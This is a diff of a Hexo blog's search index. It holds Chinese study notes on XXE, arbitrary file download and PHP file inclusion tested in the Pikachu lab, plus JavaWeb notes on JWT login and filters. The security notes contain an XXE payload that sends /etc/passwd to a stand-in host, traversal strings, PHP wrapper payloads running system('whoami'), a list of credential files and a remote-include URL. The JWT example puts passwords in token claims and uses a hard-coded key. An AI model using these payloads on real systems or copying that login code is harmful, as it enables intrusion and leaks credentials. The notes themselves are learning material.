-  XML调用DTD中实体参数的大概流程：XML解释器发现这段代码时，先检查版本；然后发现dtd，这个dtd在xml文档中，可以叫做内联dtd，%开头的是参数实体标志，%outer的值是inner中解析出的东西；调用被赋值的%outer相当于
-
-预定义实体
-  某些特殊符号的一组预定义数值集，这些特殊符号有可能会破坏XML结构（报错），可以选择用其他形式比如十六进制表示这类符号
-  &lt;test&gt;&amp;#x3C;&lt;/test&gt; 这一串十六进制表示了&lt;
-
-XML安全性问题
-ENTITY  实体可以被赋值（存储数据），但是实体功能不止这个，外部实体就是其中一个功能。
-  实体不仅能用来存储指定数值，还可以从本地文件或远程网络中调取相关数据，作为后续实体引用，但是这样带来了广泛的攻击面
-  比如：
-  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTITY subcribe SYSTEM &quot;secret.txt&quot;&gt;]&gt;&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;
-
-  SYSTEM表示后面的内容是外部实体；
-  如果外部实体长得是标签或者和XML很像的东西，XML解析器会报错；
-  这样的实体赋值并不是secret.txt，而是其中的内容，XML在此接收任意有效的URI包括文件，HTTP，ftp和其他协议形式的内容
-  外部实体读取了数据，这种就是外部实体注入攻击（XXE）
-外部实体注入攻击（XXE）分类带内数据  上面的示例涉及的就是带内XXE；
-  XML解析后的输出会直接显示在屏幕上
-基于错误  解析结果只有错误信息（类似Blind XXE）
-带外数据  OOB；真正的盲注，XML解析后无任何输出响应（无回显），必须执行一些带外请求把目标数据提取出来
-  场景：
-  
-  有一个能解析XML但是没有任何输出响应的web应用，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用，可以用dns平台监听web应用是否解析了XML，也可以用自己构造好的网站（SYSTEM后的外部实体URL为测试的地方）
-
-
-
-如果监听到了，就说明XML被成功解析，目标web应用正在尝试获取我们构造的网站上的资源作为外部实体，这样我们可以利用受害者的身份发起请求（服务器端请求伪造（SSRF））
-Payloadeg：
-
-&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTINY %passwd SYSTEM &quot;/etc/passwd&quot;&gt;&lt;!ENTINY %wrapper &quot;&lt;!ENTINY send SYSTEM &#x27;http://xxx.com/?passwd;&#x27;&gt;&quot;&gt;%wrapper;]&gt;&lt;pwn&gt;send;&lt;/pwn&gt;XML解释器会先解析/etc/passwd的内容赋值到参数实体%passwd中，然后解析URL中的内容赋给实体send，send再赋给参数实体%wrapper但是这样会报错，根据xml规范， dtd内部子集的参数实体调用不能在实际的标记语言（html，svg等）中来调用参数实体，但是可以在同级别中被当作标记语言调用，外部参数实体不受此限制，可以借助外部dtd绕过这个限制
-
-
-比如payload形式为：
-&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;/xxx/xx/x/test.dtd&quot;&gt;;&lt;data&gt;&amp;send;&lt;/data&gt; 莫名冒出来的send实体就来自外部的dtd
-
-
-
-%passwd最终会变成URL的一部分
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>XXE &amp;&amp; XML</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>XXE &amp;&amp; XML</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>任意文件下载漏洞学习笔记</title>
-    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-参考：https://blog.csdn.net/qq_43531669/article/details/116865660
-什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
-这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
-这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
-下载文件后复制下载链接
-得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
-filename通过GET方法传入后端
-直接看代码
-
-filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
-1、漏洞利用条件1. 
-
-存在读文件的函数：
- fopen()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
-
- fread()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
-
- include()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容
-
- readfile()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容
-
- file_get_context()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容
-
- file()
- $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容
-
- 2.读取文件的路径用户可控且未校验或校验不严
- 3.输出了文件内容
-
-
-漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd
-
-当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>任意文件下载漏洞</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
-        <tag>任意文件下载漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建自己的GitHub-page</title>
-    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
-    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
-
-
-验证ssh -T git@github.com
-
-
-新建自己的仓库
-
-
-
-
-
-
-
-
-下载git下载链接:https://git-scm.com/downloads/win
-参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
-
-搭建本地博客创建博客目录
-安装hexonpm install -g hexo/cli
-
-
-#创建一个新的hexo项目hexo init myblogs
-
-
-此时的目录结构
-
-
-cd myblogsnpm install
-
-此时项目结构
-
-运行hexo项目
-hexo server
-
-
-部署到github获取个人token
-
-
-
-
-
-
-打开_config.yml
-
-编辑_config.yml
-当前博客目录安装git插件npm install hexo-deployer-git --save
-
-最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
-
-
-博客路径
-博客配置项在_config.yml中
-修改浏览器tab页标题
-
-#部署到githubhexo g -d
-
-
-]]></content>
-      <tags>
-        <tag>杂项</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>任意文件包含漏洞学习笔记</title>
-    <url>/2024/09/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-参考：https://blog.csdn.net/qq_41575340/article/details/91897245
-什么是文件包含1.文件包含漏洞概述和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。
-什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。
-有时候由于网站功能需求，要包含的文件是一个变量，那么前端用户就可以进行选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。
-以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()区别如下:
-require():找不到被包含的文件会产生致命错误，并停止脚本运行include():找不到被包含的文件只会产生警告，脚本继续执行require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
-例子：在小皮的根目录下放一个test.php里面写上
-&lt;?php include $_GET[&#x27;test&#x27;];?&gt;
-
-在根目录下放另外一个file.php
-&lt;?php phpinfo();?&gt;
-
-构造url,把file.php作为参数传入
-http://192.168.127.231/test.php?test=file.php
-
-文件包含成功
-
-大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
-分类1.本地文件包含漏洞（LFI）仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击者更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
-eg:pikachu靶场的fileinclusion
-
-
-文件通过一个叫$filename的变量进行包含
-
-
-但是路径限制在了include下，那么在include文件夹下创建一个test.txt文件、
-&lt;?php phpinfo();?&gt;
-
-构造urlhttp://192.168.127.231/pikachu/vul/fileinclude/fi_local.php?filename=test.txt&amp;submit=提交查询
-这样test.txt就被包含执行了
-包含姿势php伪协议PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。
-有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。
-allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件allow_url_include On&#x2F;Off 允许或禁止引用URL文件php:&#x2F;&#x2F;input
-php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行
-当enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。
-利用条件：
-
-allow_url_include &#x3D; On。
-对allow_url_fopen不做要求。
-
-php:&#x2F;&#x2F;filterphp:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
-在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出
-php:&#x2F;&#x2F;filter 的使用：如php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.phpphp:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php
-其他姿势：
-file.php?file=php://filter/convert.base64-encode/resource=index.php
-
-效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。
-php:&#x2F;&#x2F;filter 伪协议组成：read&#x3D;&lt;读链的筛选列表&gt;resource&#x3D;&lt;要过滤的数据流&gt;write&#x3D;&lt;写链的筛选列表&gt;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件
-read 对应要设置的过滤器：常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器
-phar:&#x2F;&#x2F;
-利用条件：
-php版本大于等于php5.3.0
-
-假设有个文件phpinfo.php，其内容为，打包成zip压缩包phpinfo.zip
-利用：
-指定绝对路径：
-file.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php
-
-也可以使用相对路径：
-file.php?file=phar://phpinfo.zip/phpinfo.php
-
-zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）
-利用条件：
-
-php版本大于等于php5.3.0
-
-姿势：
-构造zip包的方法和phar相同。
- 但是使用zip伪协议，需要指定绝对路径，同时将#编码为%23,之后填上压缩包内的文件·。
-格式示例：
-&lt;?php$a=($_GET[&quot;file&quot;]);include($a);?&gt;
-
-压缩及协议访问格式：
-压缩文件为.zip后缀zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php压缩文件为.bz2后缀compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php压缩文件为.gz后缀compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php
-data：URI schema利用条件：
-
-php版本大于等于php5.2
-allow_url_fopen &#x3D; On
-allow_url_include &#x3D; On
-
-姿势一：
-?file=data:text/plain,&lt;?php phpinfo();?&gt;
-
-也可以执行命令：
-?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;
-
-姿势二：
-?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
-
-PD9waHAgc3lzdGVtKCd3aG9hbWknKTs&#x2F;Pg&#x3D;&#x3D;的base64解码为：
-&lt;?php system(&#x27;whoami&#x27;);?&gt;
-
-包含session利用条件：
-1.session文件路径已知，且其中内容部分可控。
-
-姿势：
-php的session文件的保存路径可以在phpinfo的session.save_path看到。
-常见的php-session存放位置：
-/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID
-
-其中，session文件的格式是固定的：sess_phpsessid.而phpsessid在发送的请求的cookie字段中可以看到。
-敏感文件位置Linux：
-/etc/passwd                                                                      //  账户信息/etc/shadow                                                                      //  账户密码文件/usr/local/app/apache2/conf/httpd.conf                                           //   Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf                                //   虚拟网站配置/usr/local/app/php5/lib/php.ini                                                  //   PHP相关配置/etc/httpd/conf/httpd.conf                                                       //   Apache配置文件/etc/my.conf                                                                     //   mysql 配置文件
-
-Win：
-c:\boot.ini                                                                      // 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml                                         //  IIS配置文件c:\windows\repair\sam                                                            //  存储Windows系统初次安装的密码c:\Program Files\mysql\my.ini                                                    //   MySQL配置c:\Program Files\mysql\data\mysql\user.MYD                                       //   MySQL rootc:\windows\php.ini                                                               //   php 配置信息c:\windows\my.ini                                                                //   MySQL 配置文件
-
-
-
-2.远程文件包含漏洞（RFI） 如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)
-能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 
-eg测试代码：
-
-
-&lt;?php	$file = @$_GET[&#x27;file&#x27;];	@include($file);?&gt;
-
-在远程服务器上的文件代码(test.txt)
-
-
-&lt;?phpphpinfo();?&gt;
-
-payload:
-http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>任意文件包含漏洞</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
-        <tag>任意文件包含漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2318,6 +2061,129 @@ server:  port: 9000
 
 与@Value的区别#@Value只能一个一个注入外部属性#@ConfigurationProperties可以批量注入外部属性到bean对象中
 
+登录登录功能-- 用到的sqlselect* from emp where username = &quot;xxx&quot; and password = &quot;xxx&quot;
+
+接口文档
+
+
+
+Controller层@RestController@Slf4j@RequestMapping(&quot;/login&quot;)public class LoginController &#123;        @Autowired        private EmpService empService;        @PostMapping        public Result login(@RequestBody Emp emp)&#123;                log.info(&quot;员工登录:&#123;&#125;&quot;,emp);                Emp e = empService.login(emp);                return e==null?Result.error(&quot;用户名或密码错误&quot;):Result.success();        &#125;&#125;
+
+Service层@Overridepublic Emp login(Emp emp) &#123;    return empMapper.getByUsernameAndPassword(emp);&#125;
+
+
+
+Mapper层@Select(&quot;select * from emp where username=#&#123;username&#125; and password = #&#123;password&#125;&quot;)Emp getByUsernameAndPassword(Emp emp);
+
+测试:
+
+校验只这样验证会未授权访问，即使退出登录了，输入原来的url就进入了后台
+http是无状态的，请求其他业务时，并不知道用户在登录业务这块到底登录了没有
+
+会话技术
+Cookie
+@RestController@RequestMapping(&quot;/cookie&quot;)public class CookieController &#123;//        获取cookie        @GetMapping(&quot;/get&quot;)        public Result get(HttpServletRequest request)&#123;                Cookie[] cookies = request.getCookies();                for (Cookie cookie : cookies) &#123;                        if(&quot;test&quot;.equals(cookie.getName()))&#123;                                System.out.println(cookie.toString());                        &#125;                &#125;                return Result.success();        &#125;//        设置cookie        @GetMapping(&quot;/set&quot;)        public Result set(HttpServletResponse response)&#123;                response.addCookie(new Cookie(&quot;test&quot;,&quot;114514&quot;));                return Result.success();        &#125;&#125;
+
+测试:
+
+
+
+优缺点
+跨域:
+三个维度有一个不同就是跨域
+
+Session
+@RestController@Slf4j@RequestMapping(&quot;/session&quot;)public class SessionController &#123;        @GetMapping(&quot;/set&quot;)        public Result set(HttpSession session)&#123;                log.info(&quot;Session-ID:&#123;&#125;&quot;,session.hashCode());                session.setAttribute(&quot;Admin&quot;,&quot;Admin&quot;);                return Result.success();        &#125;        @GetMapping(&quot;/get&quot;)        public Result get(HttpServletRequest request)&#123;                HttpSession session = request.getSession();                                log.info(&quot;Session-ID:&#123;&#125;&quot;,session.hashCode());                Object sessionAttribute = session.getAttribute(&quot;Admin&quot;);                return Result.success(sessionAttribute);        &#125;&#125;
+
+测试:
+&#x2F;session&#x2F;get
+
+响应的key:
+
+&#x2F;session&#x2F;set
+
+日志输出
+
+优缺点会出现同一个浏览器的两个请求获取到不同的sessionID
+
+令牌
+JWT令牌
+
+生成使用的算法
+
+生成jwt的操作
+@Testpublic void testGenJWT()&#123;    Map&lt;String,Object&gt; claims = new HashMap&lt;&gt;();    claims.put(&quot;id&quot;,1);    claims.put(&quot;name&quot;,&quot;淳平&quot;);    String jwt = Jwts.builder()        .signWith(SignatureAlgorithm.HS256, &quot;114514&quot;) //算法以及密钥        .addClaims(claims) //自定义内容(Payload)        .setExpiration(new Date(System.currentTimeMillis() + 3600 * 1000)) //设置到期时间，这里设置1h 3600*1000ms        .compact();    System.out.println(jwt);&#125;
+
+
+将生成的令牌放到官网进行解码
+
+我们只是简单测试一下jwt的生成，可以注释掉SpringBootTest注解，这样就不会加载整个项目
+
+既然生成了，那我们如何解析呢
+解析@Testpublic void parseJwt() &#123;        Claims claims = Jwts.parser()                .setSigningKey(&quot;114514&quot;) //密钥                .parseClaimsJws(&quot;&quot;) //前一步生成的令牌,parseClaimsJws千万不要把Jws写错成Jwt                .getBody(); //获取payload部分        System.out.println(claims);&#125;
+
+
+#JWT校验时用到签名密钥，必须和生成JWT令牌时使用的密钥是配套的#如果JWT令牌解析校验时报错，则JWT令牌被篡改或失效，令牌非法
+
+案例:接口文档
+
+JWT令牌工具类
+public class JWTUtils &#123;        private static String signKey = &quot;114514&quot;; //密钥;        private static Long expire = 43200000L; //12h过期        /**         * 生成JWT令牌         * @param claims JWT第二部分负载 payload 中存储的内容         * @return         */        public static String generateJwt(Map&lt;String, Object&gt; claims)&#123;                String jwt = Jwts.builder()                        .addClaims(claims)                        .signWith(SignatureAlgorithm.HS256, signKey)                        .setExpiration(new Date(System.currentTimeMillis() + expire))                        .compact();                return jwt;        &#125;        /**         * 解析JWT令牌         * @param jwt JWT令牌         * @return JWT第二部分负载 payload 中存储的内容         */        public static Claims parseJWT(String jwt)&#123;                Claims claims = Jwts.parser()                        .setSigningKey(signKey)                        .parseClaimsJws(jwt)                        .getBody();                return claims;        &#125;&#125;
+
+LoginController
+@RestController@Slf4j@RequestMapping(&quot;/login&quot;)public class LoginController &#123;        @Autowired        private EmpService empService;        @PostMapping        public Result login(@RequestBody Emp emp)&#123;                log.info(&quot;员工登录:&#123;&#125;&quot;,emp);                Emp e = empService.login(emp);                if(e != null)&#123; //用户登录成功                        Map&lt;String,Object&gt; claims = new HashMap&lt;&gt;();                        claims.put(&quot;id&quot;,e.getId());                        claims.put(&quot;username&quot;,e.getUsername());                        claims.put(&quot;password&quot;,e.getPassword());                        claims.put(&quot;name&quot;,e.getName());                        claims.put(&quot;gender&quot;,e.getGender());                        claims.put(&quot;image&quot;,e.getImage());                        claims.put(&quot;job&quot;,e.getJob());                        String jwt = JWTUtils.generateJwt(claims);                        return Result.success(jwt);                &#125;                return Result.error(&quot;用户名或密码错误&quot;);        &#125;&#125;
+
+测试
+
+Filter过滤器
+
+filterdemo
+import jakarta.servlet.*;import jakarta.servlet.annotation.WebFilter;import java.io.IOException;@WebFilter(urlPatterns = &quot;/*&quot;) //拦截所有public class FilterDemo implements Filter &#123;        @Override        public void init(FilterConfig filterConfig) throws ServletException &#123;                System.out.println(&quot;init方法执行&quot;);        &#125;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                System.out.println(&quot;doFilter方法执行&quot;);        &#125;        @Override        public void destroy() &#123;                System.out.println(&quot;destory方法执行&quot;);        &#125;&#125;
+
+启动类
+@ServletComponentScan //要加上这个，因为Filter不是SpringBoot的组件@SpringBootApplicationpublic class SpringMybatisDemoApplication &#123;        public static void main(String[] args) &#123;                SpringApplication.run(SpringMybatisDemoApplication.class, args);        &#125;&#125;
+
+测试
+运行
+
+发送请求
+
+拦截到了请求
+
+拦截多次
+
+放行
+@Overridepublic void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        System.out.println(&quot;doFilter方法执行&quot;);        filterChain.doFilter(servletRequest,servletResponse); //使用这个api进行放行数据&#125;
+
+销毁
+
+详解
+放行后访问对应web资源后，还会再回到filter中，但是不会从头开始执行filter，从chain.filter后执行（只执行放行后逻辑）
+拦截路径
+过滤器链
+//filter1@WebFilter(urlPatterns = &quot;/*&quot;) //拦截所有public class FilterDemo implements Filter &#123;        @Override        public void init(FilterConfig filterConfig) throws ServletException &#123;                System.out.println(&quot;init方法执行&quot;);        &#125;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                System.out.println(&quot;Filter1拦截到请求...放行前&quot;);                filterChain.doFilter(servletRequest,servletResponse);                System.out.println(&quot;Filter1拦截到请求...放行前&quot;);        &#125;        @Override        public void destroy() &#123;                System.out.println(&quot;destory方法执行&quot;);        &#125;&#125;
+
+
+
+//filter2@WebFilter(urlPatterns = &quot;/*&quot;)public class FilterDemo2 implements Filter &#123;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                System.out.println(&quot;Filter2拦截到请求...放行前&quot;);                filterChain.doFilter(servletRequest,servletResponse);                System.out.println(&quot;Filter2拦截到请求...放行前&quot;);        &#125;&#125;
+
+
+
+filterChain的doFilter会将请求&#x2F;响应发送到下一个Filter，如果是最后一个Filter了，就访问web资源&#x2F;响应数据给浏览器
+案例-登录校验所有被拦截到的请求都要校验令牌吗?login不用，因为这步人家根本没有令牌
+拦截请求后，什么时候才可以放行，执行业务操作?有令牌，且令牌合法，否则返回未登录错误信息
+
+alibaba fastjson：将对象转换为json格式
+&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.76&lt;/version&gt;&lt;/dependency&gt;
+
+过滤器
+@Slf4j@WebFilter(urlPatterns = &quot;/*&quot;)public class WebFilter0 implements Filter &#123;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                //1.获取url                HttpServletRequest request = (HttpServletRequest) servletRequest;                HttpServletResponse response = (HttpServletResponse) servletResponse;                StringBuffer url = request.getRequestURL();                //2.排除/login的请求路径                String ext = url.substring(url.lastIndexOf(&quot;/&quot;));                log.info(&quot;请求路径:&#123;&#125;&quot;,ext);                if (&quot;/login&quot;.equals(ext)) &#123;                        log.info(&quot;登陆操作,放行&quot;);                        filterChain.doFilter(servletRequest, servletResponse);                        return;                &#125; else &#123;                        //3.获取请求头中的token                        String jwt = request.getHeader(&quot;token&quot;);                        //4.判断token存在性，不存在，返回未登录                        if (!StringUtils.hasLength(jwt)) &#123; //使用StringUtils工具类判断jwt是否存在                                log.info(&quot;jwt不存在&quot;);                                Result result = Result.error(&quot;NOT_LOGIN&quot;);                                //手动将对象转换为json格式 alibaba fastJson                                String jsonString = JSONObject.toJSONString(result);                                //响应给浏览器                                response.getWriter().write(jsonString);                                return;                        &#125;                        //5.token存在，判断合法性，若不合法，返回未登录                        try &#123;                                Map&lt;String, Object&gt; claims = JWTUtils.parseJWT(jwt);                        &#125; catch (Exception e) &#123;                                e.printStackTrace();                                log.info(&quot;jwt非法&quot;);                                Result result = Result.error(&quot;NOT_LOGIN&quot;);                                //手动将对象转换为json格式 alibaba fastJson                                String jsonString = JSONObject.toJSONString(result);                                //响应给浏览器                                response.getWriter().write(jsonString);                                return;                        &#125;                        //6.放行                        log.info(&quot;令牌校验通过&quot;);                        filterChain.doFilter(servletRequest, servletResponse);                &#125;        &#125;&#125;
+
+测试
+
+
+
+
 ]]></content>
       <categories>
         <category>Web开发</category>
@@ -2326,6 +2192,263 @@ server:  port: 9000
       <tags>
         <tag>Web开发</tag>
         <tag>JavaWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>任意文件下载漏洞学习笔记</title>
+    <url>/2024/10/14/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+参考：https://blog.csdn.net/qq_43531669/article/details/116865660
+什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
+这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
+这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
+下载文件后复制下载链接
+得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
+filename通过GET方法传入后端
+直接看代码
+
+filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
+1、漏洞利用条件1. 
+
+存在读文件的函数：
+ fopen()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
+
+ fread()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容
+
+ include()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容
+
+ readfile()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容
+
+ file_get_context()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容
+
+ file()
+ $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容
+
+ 2.读取文件的路径用户可控且未校验或校验不严
+ 3.输出了文件内容
+
+
+漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd
+
+当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>任意文件下载漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+        <tag>任意文件下载漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>任意文件包含漏洞学习笔记</title>
+    <url>/2024/09/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+参考：https://blog.csdn.net/qq_41575340/article/details/91897245
+什么是文件包含1.文件包含漏洞概述和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。
